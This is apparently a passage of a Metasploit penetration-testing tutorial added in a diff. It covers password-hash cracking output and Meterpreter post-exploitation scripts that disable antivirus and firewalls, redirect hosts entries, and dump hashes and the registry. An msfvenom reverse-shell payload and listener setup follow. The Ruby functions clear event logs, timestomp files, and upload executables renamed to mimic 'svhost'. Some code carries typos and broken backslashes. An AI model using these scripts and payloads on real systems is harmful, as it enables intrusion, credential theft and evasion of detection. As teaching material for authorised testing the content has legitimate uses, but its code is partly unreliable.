+ [*] Output: Loaded 7 password hashes with no different salts (LM DES [128/128 BS SSE2])
+ [*] Output: Remaining 3 password hashes with no different salts
+ guesses: 1  time: 0:00:00:11 DONE (Sat Jul 16 19:59:21 2011)  c/s: 29609K  trying: zwingli1900 - password1900
+ Use the "--show" option to display all of the cracked passwords reliably
+ [*] Output: Loaded 6 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+ [*] Output: password         (cred_6)
+ guesses: 1  time: 0:00:00:05 DONE (Sat Jul 16 19:59:27 2011)  c/s: 64816K  trying: |||}
+ Use the "--show" option to display all of the cracked passwords reliably
+ [*] Output: Loaded 6 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+ [*] Output: Remaining 5 password hashes with no different salts
+ [*] Output: (cred_2)
+ guesses: 0  time: 0:00:00:00 DONE (Sat Jul 16 19:59:27 2011)  c/s: 7407K  trying: 89030 - 89092
+ [*] Output: Loaded 6 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+ [*] Output: Remaining 4 password hashes with no different salts
+ [+] Cracked: Guest: (192.168.184.134:445)
+ [+] Cracked: rAWjAW2:password (192.168.184.134:445)
+ [*] Auxiliary module execution completed
+ msf auxiliary(jtr_crack_fast) >
+
+*********************
+Meterpreter Scripting
+*********************
+
+One of the most powerful features of Meterpreter is the versatility and ease of adding additional features. This is accomplished through the Meterpreter scripting environment. This section will cover the automation of tasks in a Meterpreter session through the use of this scripting environment, how you can take advantage of Meterpreter scripting, and how to write your own scripts to solve your unique needs.
+
+Before diving right in, it is worth covering a few items. Like the rest of the Metasploit framework, the scripts we will be dealing with are written in Ruby and located in the main Metasploit directory in scripts/meterpreter. If you are not familiar with Ruby, a great resource for learning it is the online book “Programming Ruby”.
+
+Before starting, please take a few minutes to review the current subversion repository of Meterpreter scripts. This is a great resource to use to see how others are approaching problems, and possibly borrow code that may be of use to you.
+
+
+Existing Scripts
+===================
+
+Metasploit comes with a ton of useful scripts that can aid you in the Metasploit Framework. These scripts are typically made by third parties and eventually adopted into the subversion repository. We’ll run through some of them and walk you through how you can use them in your own penetration test.
+
+The scripts mentioned below are intended to be used with a Meterpreter shell after the successful compromise of a target. Once you have gained a session with the target you can utilize these scripts to best suit your needs.
+
+checkvm
+^^^^^^^^^^^^^^
+
+The ‘checkvm’ script, as its name suggests, checks to see if you exploited a virtual machine. This information can be very useful.
+
+::
+
+  meterpreter > run checkvm
+
+ [*] Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
+ [*] This is a VMware Workstation/Fusion Virtual Machine
+
+
+getcountermeasure
+^^^^^^^^^^^^^^^^
+
+The ‘getcountermeasure’ script checks the security configuration on the victims system and can disable other security measures such as A/V, Firewall, and much more.
+
+::
+
+  meterpreter > run getcountermeasure
+
+ [*] Running Getcountermeasure on the target...
+ [*] Checking for contermeasures...
+ [*] Getting Windows Built in Firewall configuration...
+ [*]
+ [*]     Domain profile configuration:
+ [*]     -------------------------------------------------------------------
+ [*]     Operational mode                  = Disable
+ [*]     Exception mode                    = Enable
+ [*]
+ [*]     Standard profile configuration:
+ [*]     -------------------------------------------------------------------
+ [*]     Operational mode                  = Disable
+ [*]     Exception mode                    = Enable
+ [*]
+ [*]     Local Area Connection 6 firewall configuration:
+ [*]     -------------------------------------------------------------------
+ [*]     Operational mode                  = Disable
+ [*]
+ [*] Checking DEP Support Policy...
+
+
+getgui
+^^^^^^^^
+
+The ‘getgui’ script is used to enable RDP on a target system if it is disabled.
+
+::
+
+  meterpreter > run getgui
+
+ [!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
+ [!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
+ Windows Remote Desktop Enabler Meterpreter Script
+ Usage: getgui -u  -p
+ Or:    getgui -e
+
+ OPTIONS:
+
+   -e        Enable RDP only.
+   -f   Forward RDP Connection.
+   -h        Help menu.
+   -p   The Password of the user to add.
+   -u   The Username of the user to add.
+
+ meterpreter > run getgui -e
+
+ [*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+ [*] Carlos Perez carlos_perez@darkoperator.com
+ [*] Enabling Remote Desktop
+ [*] RDP is already enabled
+ [*] Setting Terminal Services service startup mode
+ [*] Terminal Services service is already set to auto
+ [*] Opening port in local firewall if necessary
+
+get_local_subnets
+^^^^^^^^^^^^^^^^
+
+The ‘get_local_subnets’ script is used to get the local subnet mask of a victim. This can be very useful information to have for pivoting.
+
+::
+
+  meterpreter > run get_local_subnets
+
+ Local subnet: 10.211.55.0/255.255.255.0
+
+gettelnet
+^^^^^^^^^^
+
+The ‘gettelnet’ script is used to enable telnet on the victim if it is disabled.
+
+::
+
+  meterpreter > run gettelnet
+ Windows Telnet Server Enabler Meterpreter Script
+ Usage: gettelnet -u  -p
+
+ OPTIONS:
+
+   -e        Enable Telnet Server only.
+   -f   Forward Telnet Connection.
+   -h        Help menu.
+   -p   The Password of the user to add.
+   -u   The Username of the user to add.
+
+ meterpreter > run gettelnet -e
+
+ [*] Windows Telnet Server Enabler Meterpreter Script
+ [*] Setting Telnet Server Services service startup mode
+ [*] The Telnet Server Services service is not set to auto, changing it to auto ...
+ [*] Opening port in local firewall if necessary
+
+
+hostsedit
+^^^^^^^^^^
+
+The ‘hostsedit’ Meterpreter script is for adding entries to the Windows hosts file. Since Windows will check the hosts file first instead of the configured DNS server, it will assist in diverting traffic to a fake entry or entries. Either a single entry can be provided or a series of entries can be provided with a file containing one entry per line.
+
+::
+
+  meterpreter > run hostsedit
+
+ [!] Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
+ [!] Example: run post/windows/manage/inject_host OPTION=value [...]
+ This Meterpreter script is for adding entries in to the Windows Hosts file.
+ Since Windows will check first the Hosts file instead of the configured DNS Server
+ it will assist in diverting traffic to the fake entry or entries. Either a single
+ entry can be provided or a series of entries provided a file with one per line.
+
+ OPTIONS:
+
+    -e   Host entry in the format of IP,Hostname.
+    -h        Help Options.
+    -l   Text file with list of entries in the format of IP,Hostname. One per line.
+
+ Example:
+
+
+ run hostsedit -e 127.0.0.1,google.com
+
+ run hostsedit -l /tmp/fakednsentries.txt
+
+ meterpreter > run hostsedit -e 10.211.55.162,www.microsoft.com
+ [*] Making Backup of the hosts file.
+ [*] Backup loacated in C:\WINDOWS\System32\drivers\etc\hosts62497.back
+ [*] Adding Record for Host www.microsoft.com with IP 10.211.55.162
+ [*] Clearing the DNS Cache
+
+killav
+^^^^^^^^
+
+The ‘killav’ script can be used to disable most antivirus programs running as a service on a target.
+
+::
+
+  meterpreter > run killav
+
+ [*] Killing Antivirus services on the target...
+ [*] Killing off cmd.exe...
+
+remotewinenum
+^^^^^^^^^^^^
+
+The ‘remotewinenum’ script will enumerate system information through wmic on victim. Make note of where the logs are stored.
+
+::
+
+  meterpreter > run remotewinenum
+
+ [!] Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
+ [!] Example: run post/windows/gather/wmic_command OPTION=value [...]
+ Remote Windows Enumeration Meterpreter Script
+ This script will enumerate windows hosts in the target enviroment
+ given a username and password or using the credential under witch
+ Meterpeter is running using WMI wmic windows native tool.
+ Usage:
+
+ OPTIONS:
+
+    -h        Help menu.
+    -p   Password of user on target system
+    -t   The target address
+    -u   User on the target system (If not provided it will use credential of process)
+
+ meterpreter > run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128
+
+ [*] Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142
+ [*] Running WMIC Commands ....
+ [*]     running command wimic environment list
+ [*]     running command wimic share list
+ [*]     running command wimic nicconfig list
+ [*]     running command wimic computersystem list
+ [*]     running command wimic useraccount list
+ [*]     running command wimic group list
+ [*]     running command wimic sysaccount list
+ [*]     running command wimic volume list brief
+ [*]     running command wimic logicaldisk get description,filesystem,name,size
+ [*]     running command wimic netlogin get name,lastlogon,badpasswordcount
+ [*]     running command wimic netclient list brief
+ [*]     running command wimic netuse get name,username,connectiontype,localname
+ [*]     running command wimic share get name,path
+ [*]     running command wimic nteventlog get path,filename,writeable
+ [*]     running command wimic service list brief
+ [*]     running command wimic process list brief
+ [*]     running command wimic startup list full
+ [*]     running command wimic rdtoggle list
+ [*]     running command wimic product get name,version
+ [*]     running command wimic qfe list
+
+scraper
+^^^^^^^^
+
+  The ‘scraper’ script can grab even more system information, including the entire registry.
+
+::
+
+  meterpreter > run scraper
+
+ [*] New session on 10.211.55.128:4444...
+ [*] Gathering basic system information...
+ [*] Dumping password hashes...
+ [*] Obtaining the entire registry...
+ [*] Exporting HKCU
+ [*] Downloading HKCU (C:\WINDOWS\TEMP\LQTEhIqo.reg)
+ [*] Cleaning HKCU
+ [*] Exporting HKLM
+ [*] Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)
+
+
+From our examples above we can see that there are plenty of Meterpreter scripts for us to enumerate a ton of information, disable anti-virus for us, enable RDP, and much much more.
+
+winenum
+^^^^^^^^
+
+The ‘winenum’ script makes for a very detailed windows enumeration tool. It dumps tokens, hashes and much more.
+
+::
+
+  meterpreter > run winenum
+
+ [*] Running Windows Local Enumerion Meterpreter Script
+ [*] New session on 10.211.55.128:4444...
+ [*] Saving report to /root/.msf4/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
+ [*] Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
+ [*]     This is a VMware Workstation/Fusion Virtual Machine
+ [*] Running Command List ...
+ [*]     running command cmd.exe /c set
+ [*]     running command arp -a
+ [*]     running command ipconfig /all
+ [*]     running command ipconfig /displaydns
+ [*]     running command route print
+ [*]     running command net view
+ [*]     running command netstat -nao
+ [*]     running command netstat -vb
+ [*]     running command netstat -ns
+ [*]     running command net accounts
+ [*]     running command net accounts /domain
+ [*]     running command net session
+ [*]     running command net share
+ [*]     running command net group
+ [*]     running command net user
+ [*]     running command net localgroup
+ [*]     running command net localgroup administrators
+ [*]     running command net group administrators
+ [*]     running command net view /domain
+ [*]     running command netsh firewall show config
+ [*]     running command tasklist /svc
+ [*]     running command tasklist /m
+ [*]     running command gpresult /SCOPE COMPUTER /Z
+ [*]     running command gpresult /SCOPE USER /Z
+ [*] Running WMIC Commands ....
+ [*]     running command wmic computersystem list brief
+ [*]     running command wmic useraccount list
+ [*]     running command wmic group list
+ [*]     running command wmic service list brief
+ [*]     running command wmic volume list brief
+ [*]     running command wmic logicaldisk get description,filesystem,name,size
+ [*]     running command wmic netlogin get name,lastlogon,badpasswordcount
+ [*]     running command wmic netclient list brief
+ [*]     running command wmic netuse get name,username,connectiontype,localname
+ [*]     running command wmic share get name,path
+ [*]     running command wmic nteventlog get path,filename,writeable
+ [*]     running command wmic process list brief
+ [*]     running command wmic startup list full
+ [*]     running command wmic rdtoggle list
+ [*]     running command wmic product get name,version
+ [*]     running command wmic qfe
+ [*] Extracting software list from registry
+ [*] Finished Extraction of software list from registry
+ [*] Dumping password hashes...
+ [*] Hashes Dumped
+ [*] Getting Tokens...
+ [*] All tokens have been processed
+ [*] Done!
+
+
+Writing Meterpreter Scripts
+==========================
+
+There are a few things you need to keep in mind when creating a new meterpreter script.
+
+* Not all versions of Windows are the same
+* Some versions of Windows have security countermeasures for some of the commands
+* Not all command line tools are in all versions of Windows.
+* Some of the command line tools switches vary depending on the version of Windows
+
+In short, the same constraints that you have when working with standard exploitation methods. MSF can be of great help, but it can’t change the fundamentals of that target. Keeping this in mind can save a lot of frustration down the road. So keep your target’s Windows version and service pack in mind, and build to it.
+
+For our purposes, we are going to create a stand alone binary that will be run on the target system that will create a reverse Meterpreter shell back to us. This will rule out any problems with an exploit as we work through our script development.
+
+::
+
+  root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
+ Found 10 compatible encoders
+ Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+ x86/shikata_ga_nai succeeded with size 326 (iteration=0)
+ x86/shikata_ga_nai chosen with final size 326
+ Payload size: 326 bytes
+ Saved as: Meterpreter.exe
+
+Wonderful. Now, we move the executable to our Windows machine that will be our target for the script we are going to write. We just have to set up our listener. To do this, lets create a short script to start up multi-handler for us.
+
+::
+
+  root@kali:~# touch meterpreter.rc
+ root@kali:~# echo use exploit/multi/handler >> meterpreter.rc
+ root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc
+ root@kali:~# echo set LHOST 192.168.1.184 >> meterpreter.rc
+ root@kali:~# echo set ExitOnSession false >> meterpreter.rc
+ root@kali:~# echo exploit -j -z >> meterpreter.rc
+ root@kali:~# cat meterpreter.rc
+ use exploit/multi/handler
+ set PAYLOAD windows/meterpreter/reverse_tcp
+ set LHOST 192.168.1.184
+ set ExitOnSession false
+ exploit -j -z
+
+
+Here we are using the exploit multi handler to receive our payload, we specify that the payload is a Meterpreter reverse_tcp payload, we set the payload option, we make sure that the multi handler will not exit once it receives a session since we might need to re-establish one due to an error or we might be testing under different versions of Windows from different target hosts.
+
+While working on the scripts, we will save the test scripts to /usr/share/metasploit-framework/scripts/meterpreter so that they can be run.
+
+Now, all that remains is to start up msfconsole with our our resource script.
+
+::
+
+  root@kali:~# msfconsole -r meterpreter.rc
+
+        =[ metasploit v4.8.2-2014021901 [core:4.8 api:1.0] ]
+ + -- --=[ 1265 exploits - 695 auxiliary - 202 post ]
+ + -- --=[ 330 payloads - 32 encoders - 8 nops      ]
+
+ resource> use exploit/multi/handler
+ resource> set PAYLOAD windows/meterpreter/reverse_tcp
+ PAYLOAD => windows/meterpreter/reverse_tcp
+ resource> set LHOST 192.168.1.184
+ LHOST => 192.168.1.184
+ resource> set ExitOnSession false
+ ExitOnSession => false
+ resource> exploit -j -z
+ [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Starting the payload handler...
+
+As can be seen above, Metasploit is listening for a connection. We can now execute our executable in our Windows host and we will receive a session. Once the session is established, we use the sessions command with the –i switch and the number of the session to interact with it:
+
+::
+
+  [*] Sending stage (718336 bytes)
+ [*] Meterpreter session 1 opened (192.168.1.158:4444 -> 192.168.1.104:1043)
+
+ msf exploit(handler) > sessions -i 1
+ [*] Starting interaction with 1...
+
+ meterpreter >
+
+
+Custom Scripting
+=========
+
+Now that we have a feel for how to use irb to test API calls, let’s look at what objects are returned and test basic constructs. Now, no first script would be complete without the standard Hello World, so lets create a script named helloworld.rb and save it to /usr/share/metasploit-framework/scripts/meterpreter.
+
+::
+
+  root@kali:~# echo “print_status(“Hello World”)” > /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+
+We now execute our script from the console by using the run command.
+
+::
+
+  meterpreter > run helloworld
+ [*] Hello World
+ meterpreter >
+
+Now, lets build upon this base. We will add a couple of other API calls to the script. Add these lines to the script:
+
+::
+
+  print_error(“this is an error!”)
+ print_line(“this is a line”)
+
+Much like the concept of standard in, standard out, and standard error, these different lines for status, error, and line all serve different purposes on giving information to the user running the script.
+
+Now, when we execute our file we get:
+
+::
+
+  meterpreter > run helloworld
+ [*] Hello World
+ [-] this is an error!
+ this is a line
+ meterpreter >
+
+helloworld.rb
+^^^^^^^^^^^^
+
+::
+
+  print_status("Hello World")
+ print_error("this is an error!")
+ print_line("This is a line")
+
+Wonderful! Let’s go a bit further and create a function to print some general information and add error handling to it in a second file. This new function will have the following architecture:
+
+::
+
+  def geninfo(session)
+   begin
+   …..
+   rescue ::Exception => e
+   …..
+   end
+ end
+
+The use of functions allows us to make our code modular and more re-usable. This error handling will aid us in the troubleshooting of our scripts, so using some of the API calls we covered previously, we could build a function that looks like this:
+
+::
+
+  def getinfo(session)
+   begin
+      sysnfo = session.sys.config.sysinfo
+      runpriv = session.sys.config.getuid
+      print_status("Getting system information ...")
+      print_status("tThe target machine OS is #{sysnfo['OS']}")
+      print_status("tThe computer name is #{'Computer'} ")
+      print_status("tScript running as #{runpriv}")
+   rescue ::Exception => e
+      print_error("The following error was encountered #{e}")
+   end
+ end
+
+Let’s break down what we are doing here. We define a function named getinfo which takes one paramater that we are placing in a local variable named ‘session’. This variable has a couple methods that are called on it to extract system and user information, after which we print a couple of status lines that report the findings from the methods. In some cases, the information we are printing comes out from a hash, so we have to be sure to call the variable correctly. We also have an error handler placed in there that will return what ever error message we might encounter.
+
+Now that we have this function, we just have to call it and give it the Meterpreter client session. To call it, we just place the following at the end of our script:
+
+::
+
+  getinfo(client)
+
+
+Now we execute the script and we can see the output of it:
+
+::
+
+  meterpreter > run helloworld2
+ [*] Getting system information ...
+ [*]     The target machine OS is Windows XP (Build 2600, Service Pack 3).
+ [*]     The computer name is Computer
+ [*]     Script running as WINXPVM01labuser
+
+helloworld2.rb
+^^^^^^^^^^^^^^
+
+::
+
+  def getinfo(session)
+    begin
+       sysnfo = session.sys.config.sysinfo
+       runpriv = session.sys.config.getuid
+       print_status("Getting system information ...")
+       print_status("tThe target machine OS is #{sysnfo['OS']}")
+       print _status("tThe computer name is #{'Computer'} ")
+       print_status("tScript running as #{runpriv}")
+ rescue ::Exception => e
+       print_error("The following error was encountered #{e}")
+    end
+ end
+
+
+ getinfo(client)
+
+
+As you can see, these very simple steps build up to give us the basics for creating advanced Meterpreter scripts. Let’s expand on this script to gather more information on our target. Let’s create another function for executing commands and printing their output:
+
+::
+
+  def list_exec(session,cmdlst)
+    print_status("Running Command List ...")
+    r=''
+    session.response_timeout=120
+    cmdlst.each do |cmd|
+       begin
+          print_status "trunning command #{cmd}"
+          r = session.sys.process.execute(“cmd.exe /c #{cmd}”, nil, {'Hidden' => true, 'Channelized' => true})
+          while(d = r.channel.read)
+
+             print_status("t#{d}")
+          end
+          r.channel.close
+          r.close
+       rescue ::Exception => e
+          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
+       end
+    end
+ end
+
+
+Again, lets break down what we are doing here. We define a function that takes two paramaters, the second of which will be a array. A timeout is also established so that the function does not hang on us. We then set up a “for each” loop that runs on the array that is passed to the function which will take each item in the array and execute it on the system through cmd.exe /c, printing the status that is returned from the command execution. Finally, an error handler is established to capture any issues that come up while executing the function.
+
+Now we set an array of commands for enumerating the target host:
+
+::
+
+  commands = [ “set”,
+   “ipconfig  /all”,
+   “arp –a”]
+
+and then call it with the command
+
+::
+  list_exec(client,commands)
+
+With that in place, when we run it we get:
+
+::
+
+  meterpreter > run helloworld3
+ [*] Running Command List ...
+ [*]     running command set
+ [*]     ALLUSERSPROFILE=C:\Documents and Settings\All Users
+ APPDATA=C:\Documents and Settings\P0WN3D\Application Data
+ CommonProgramFiles=C:\Program Files\Common Files
+ COMPUTERNAME=TARGET
+ ComSpec=C:\WINNT\system32\cmd.exe
+ HOMEDRIVE=C:
+ HOMEPATH=
+ LOGONSERVER=TARGET
+ NUMBER_OF_PROCESSORS=1
+ OS=Windows_NT
+ Os2LibPath=C:\WINNT\system32\os2dll;
+ Path=C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
+ PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
+ PROCESSOR_ARCHITECTURE=x86
+ PROCESSOR_IDENTIFIER=x86 Family 6 Model 7 Stepping 6, GenuineIntel
+ PROCESSOR_LEVEL=6
+ PROCESSOR_REVISION=0706
+ ProgramFiles=C:\Program Files
+ PROMPT=$P$G
+ SystemDrive=C:
+ SystemRoot=C:\WINNT
+ TEMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
+ TMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
+ USERDOMAIN=TARGET
+ USERNAME=P0WN3D
+ USERPROFILE=C:\Documents and Settings\P0WN3D
+ windir=C:\WINNT
+
+ [*]     running command ipconfig  /all
+ [*]
+ Windows 2000 IP Configuration
+
+ Host Name . . . . . . . . . . . . : target
+ Primary DNS Suffix  . . . . . . . :
+ Node Type . . . . . . . . . . . . : Hybrid
+ IP Routing Enabled. . . . . . . . : No
+ WINS Proxy Enabled. . . . . . . . : No
+ DNS Suffix Search List. . . . . . : localdomain
+
+ Ethernet adapter Local Area Connection:
+
+ Connection-specific DNS Suffix  . : localdomain
+ Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter
+ Physical Address. . . . . . . . . : 00-0C-29-85-81-55
+ DHCP Enabled. . . . . . . . . . . : Yes
+ Autoconfiguration Enabled . . . . : Yes
+ IP Address. . . . . . . . . . . . : 172.16.104.145
+ Subnet Mask . . . . . . . . . . . : 255.255.255.0
+ Default Gateway . . . . . . . . . : 172.16.104.2
+ DHCP Server . . . . . . . . . . . : 172.16.104.254
+ DNS Servers . . . . . . . . . . . : 172.16.104.2
+ Primary WINS Server . . . . . . . : 172.16.104.2
+ Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM
+ Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM
+
+ [*]     running command arp -a
+ [*]
+ Interface: 172.16.104.145 on Interface 0x1000003
+ Internet Address      Physical Address      Type
+ 172.16.104.2          00-50-56-eb-db-06     dynamic
+ 172.16.104.150        00-0c-29-a7-f1-c5     dynamic
+
+ meterpreter >
+
+helloworld3.rb
+^^^^^^^^^^^^
+
+::
+
+  def list_exec(session,cmdlst)
+   print_status("Running Command List ...")
+   r=''
+   session.response_timeout=120
+   cmdlst.each do |cmd|
+      begin
+         print_status "running command #{cmd}"
+         r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+         while(d = r.channel.read)
+
+            print_status("t#{d}")
+         end
+         r.channel.close
+         r.close
+      rescue ::Exception => e
+         print_error("Error Running Command #{cmd}: #{e.class} #{e}")
+      end
+   end
+ end
+
+ commands = [ "set",
+   "ipconfig  /all",
+   "arp -a"]
+
+ list_exec(client,commands)
+
+As you can see, creating custom Meterpreter scripts is not difficult if you take it one step at a time, building upon itself. Just remember to frequently test, and refer back to the source on how various API calls operate.
+
+Useful API Calls
+===============
+
+We will cover some common API calls for scripting the Meterpreter and write a script using some of these API calls. For further API calls and examples, look at the Command Dispacher code and the REX documentation that was mentioned earlier.
+
+For this, it is easiest for us to use the irb shell which can be used to run API calls directly and see what is returned by these calls. We get into the irb by running the ‘irb’ command from the Meterpreter shell.
+
+::
+
+  meterpreter > irb
+ [*] Starting IRB shell
+ [*] The 'client' variable holds the meterpreter client
+
+ >>
+
+We will start with calls for gathering information on the target. Let’s get the machine name of the target host. The API call for this is ‘client.sys.config.sysinfo’
+
+::
+
+  >> client.sys.config.sysinfo
+ => {"OS"=>"Windows XP (Build 2600, Service Pack 3).", "Computer"=>"WINXPVM01"}
+ >>
+
+As we can see in irb, a series of values were returned. If we want to know the type of values returned, we can use the class object to learn what is returned:
+
+::
+
+  >> client.sys.config.sysinfo.class
+ => Hash
+ >>
+
+We can see that we got a hash, so we can call elements of this hash through its key. Let’s say we want the OS version only:
+
+::
+
+  >> client.sys.config.sysinfo['OS']
+ => "Windows XP (Build 2600, Service Pack 3)."
+ >>
+
+Now let’s get the credentials under which the payload is running. For this, we use the ‘client.sys.config.getuid’ API call:
+
+::
+
+  >> client.sys.config.getuid
+ => "WINXPVM01\labuser"
+ >>
+
+To get the process ID under which the session is running, we use the ‘client.sys.process.getpid’ call which can be used for determining what process the session is running under:
+
+::
+
+  >> client.sys.process.getpid
+ => 684
+
+We can use API calls under ‘client.sys.net’ to gather information about the network configuration and environment in the target host. To get a list of interfaces and their configuration we use the API call ‘client.net.config.interfaces’:
+
+::
+
+  >> client.net.config.interfaces
+ => [#, #]
+ >> client.net.config.interfaces.class
+ => Array
+
+As we can see it returns an array of objects that are of type Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface that represents each of the interfaces. We can iterate through this array of objects and get what is called a pretty output of each one of the interfaces like this:
+
+
+::
+
+  >> interfaces = client.net.config.interfaces
+ => [#, #]
+ >> interfaces.each do |i|
+ ?> puts i.pretty
+ >> end
+ MS TCP Loopback interface
+ Hardware MAC: 00:00:00:00:00:00
+ IP Address  : 127.0.0.1
+ Netmask     : 255.0.0.0
+
+ AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
+ Hardware MAC: 00:0c:29:dc:aa:e4
+ IP Address  : 192.168.1.104
+ Netmask     : 255.255.255.0
+
+Useful Functions
+===================
+
+Available WMIC Commands
+^^^^^^^^^^^^^^^^^^^^
+
+::
+
+  #-------------------------------------------------------------------------------
+
+ def wmicexec(session,wmiccmds= nil)
+        windr = ''
+        tmpout = ''
+        windrtmp = ""
+        session.response_timeout=120
+        begin
+                tmp = session.fs.file.expand_path("%TEMP%")
+                wmicfl = tmp + ""+ sprintf("%.5d",rand(100000))
+                wmiccmds.each do |wmi|
+                        print_status "running command wmic #{wmi}"
+                        cmd = "cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe"
+                        opt = "/append:#{wmicfl} #{wmi}"
+                        r = session.sys.process.execute( cmd, opt,{'Hidden' => true})
+                        sleep(2)
+                        #Making sure that wmic finnishes before executing next wmic command
+                        prog2check = "wmic.exe"
+                        found = 0
+                        while found == 0
+                                session.sys.process.get_processes().each do |x|
+                                        found =1
+                                        if prog2check == (x['name'].downcase)
+                                                sleep(0.5)
+                                                            print_line "."
+                                                found = 0
+                                        end
+                                end
+                        end
+                        r.close
+                end
+                # Read the output file of the wmic commands
+                wmioutfile = session.fs.file.new(wmicfl, "rb")
+                until wmioutfile.eof?
+                        tmpout >> wmioutfile.read
+                end
+                wmioutfile.close
+        rescue ::Exception => e
+                print_status("Error running WMIC commands: #{e.class} #{e}")
+        end
+        # We delete the file with the wmic command output.
+        c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
+        c.close
+        tmpout
+ end
+
+
+Change MAC Time of Files
+^^^^^^^^^^^^^^^^^^
+
+::
+
+  #-------------------------------------------------------------------------------
+
+ # The files have to be in %WinDir%System32 folder.
+ def chmace(session,cmds)
+    windir = ''
+    windrtmp = ""
+    print_status("Changing Access Time, Modified Time and Created Time of Files Used")
+    windir = session.fs.file.expand_path("%WinDir%")
+    cmds.each do |c|
+        begin
+            session.core.use("priv")
+            filetostomp = windir + "system32"+ c
+            fl2clone = windir + "system32chkdsk.exe"
+            print_status("tChanging file MACE attributes on #{filetostomp}")
+            session.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)
+
+        rescue ::Exception => e
+            print_status("Error changing MACE: #{e.class} #{e}")
+        end
+    end
+ end
+
+
+Check for UAC
+^^^^^^^^^^^^^^
+
+::
+
+  #-------------------------------------------------------------------------------
+
+ def checkuac(session)
+    uac = false
+    begin
+        winversion = session.sys.config.sysinfo
+        if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
+            print_status("Checking if UAC is enaled ...")
+            key = 'HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem'
+            root_key, base_key = session.sys.registry.splitkey(key)
+            value = "EnableLUA"
+            open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
+            v = open_key.query_value(value)
+            if v.data == 1
+                uac = true
+            else
+                uac = false
+            end
+            open_key.close_key(key)
+        end
+    rescue ::Exception => e
+        print_status("Error Checking UAC: #{e.class} #{e}")
+    end
+    return uac
+ end
+
+
+Clear All Event Logs
+^^^^^^^^^^^^^^^^^^^^^^
+
+::
+
+  #-------------------------------------------------------------------------------
+
+ def clrevtlgs(session)
+    evtlogs = [
+        'security',
+        'system',
+        'application',
+        'directory service',
+        'dns server',
+        'file replication service'
+    ]
+    print_status("Clearing Event Logs, this will leave and event 517")
+    begin
+        evtlogs.each do |evl|
+            print_status("tClearing the #{evl} Event Log")
+            log = session.sys.eventlog.open(evl)
+            log.clear
+        end
+        print_status("Alll Event Logs have been cleared")
+    rescue ::Exception => e
+        print_status("Error clearing Event Log: #{e.class} #{e}")
+
+    end
+ end
+
+Execute List of Commands
+^^^^^^^^^^^^^^^^^^^^^^
+
+::
+
+  #-------------------------------------------------------------------------------
+
+ def list_exec(session,cmdlst)
+    if cmdlst.kind_of? String
+        cmdlst = cmdlst.to_a
+    end
+    print_status("Running Command List ...")
+    r=''
+    session.response_timeout=120
+    cmdlst.each do |cmd|
+        begin
+            print_status "trunning command #{cmd}"
+            r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
+            while(d = r.channel.read)
+
+                print_status("t#{d}")
+            end
+            r.channel.close
+            r.close
+        rescue ::Exception => e
+            print_error("Error Running Command #{cmd}: #{e.class} #{e}")
+        end
+    end
+ end
+
+
+Upload Files and Executables
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+::
+
+  #-------------------------------------------------------------------------------
+
+ def upload(session,file,trgloc = nil)
+    if not ::File.exists?(file)
+            raise "File to Upload does not exists!"
+        else
+        if trgloc == nil
+        location = session.fs.file.expand_path("%TEMP%")
+        else
+            location = trgloc
+        end
+        begin
+            if file =~ /S*(.exe)/i
+                       fileontrgt = "#{location}svhost#{rand(100)}.exe"
+            else
+                    fileontrgt = "#{location}TMP#{rand(100)}"
+            end
+            print_status("Uploadingd #{file}....")
+            session.fs.file.upload_file("#{fileontrgt}","#{file}")
+            print_status("#{file} uploaded!")
+            print_status("#{fileontrgt}")
+        rescue ::Exception => e
+            print_status("Error uploading file #{file}: #{e.class} #{e}")
+        end
+    end
+    return fileontrgt
+ end
+
+Write Data to File
+^^^^^^^^^^^^^^^^^^
+
+::
+
+  #-----------------------------------------------------
+
+ def filewrt(file2wrt, data2wrt)
+        output = ::File.open(file2wrt, "a")
+        data2wrt.each_line do |d|
+                output.puts(d)
+        end
+        output.close
+ end
+
+
+
+******************
+Maintaining Access
+*******************
+
+Pivoting to Maintain Access
+===========================
+
